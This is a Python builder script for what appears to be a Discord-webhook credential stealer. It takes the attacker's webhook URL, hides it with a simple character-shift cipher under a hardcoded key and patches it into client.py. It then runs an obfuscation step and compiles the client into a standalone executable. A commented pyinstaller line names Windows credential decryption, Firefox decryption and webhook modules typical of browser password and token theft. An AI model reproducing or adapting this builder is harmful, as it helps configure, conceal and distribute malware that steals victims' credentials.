import uuid
import base64
import hashlib
import os 
def transcrireCle(cle):
	return "".join([str(ord(elt)) for elt in cle])

chiffre = []
hasher = ""
def chiffrer(cle, msg):
	cle = transcrireCle(cle)
	chiffre = []
	message = msg

	for elt in message:
		chiffre.append(ord(elt))


	for i in range(len(chiffre)):
		pos_cle = i % len(cle)
		chiffre[i] += int(cle[pos_cle])


	crypt = ""
	for elt in chiffre:
		try:
			crypt += chr(elt)
		except UnicodeEncodeError:
			crypt += "x"
	return chiffre
def Getchiffrer(cle, msg):
	cle = transcrireCle(cle)
	chiffre = []
	message = msg

	for elt in message:
		chiffre.append(ord(elt))


	for i in range(len(chiffre)):
		pos_cle = i % len(cle)
		chiffre[i] += int(cle[pos_cle])


	crypt = ""
	for elt in chiffre:
		try:
			crypt += chr(elt)
		except UnicodeEncodeError:
			crypt += "x"
	return crypt

key ="loooood"
webhook = input("Webhook : ")
print(f"Salt : {key}\n\nWebhook : {str(Getchiffrer(key, webhook))}\n\nMagic Number : {str(chiffrer(key, webhook))}")
filecontent = open("client.py", "r").read()
filecontent = filecontent.replace("yolesGenSCestLeWebHook", str(Getchiffrer(key, webhook))).replace("launch_compile.bat_before", str(chiffrer(key, webhook))).replace("0xSxZSAlty", "loooood")
open("client.py", "w",encoding="utf-8").write(str(filecontent))
print("[.] Replaced variables in file.")

val = input("Do you use py, python or python3 filename.py to launch file? (py/python/python3) : ")

os.system(val + " hash.py")

#os.system('pyinstaller --onefile --hidden-import sqlite3 --hidden-import discord_webhook --hidden-import tkinter --hidden-import win32crypt --hidden-import command --hidden-import textwrap --hidden-import FireFoxDecrypt --hidden-import requests --hidden-import discord --hidden-import pycrypto  clientencoded.py -i "NONE"')
os.system('pyinstaller --onefile client.py.hashed.py -i "NONE"')
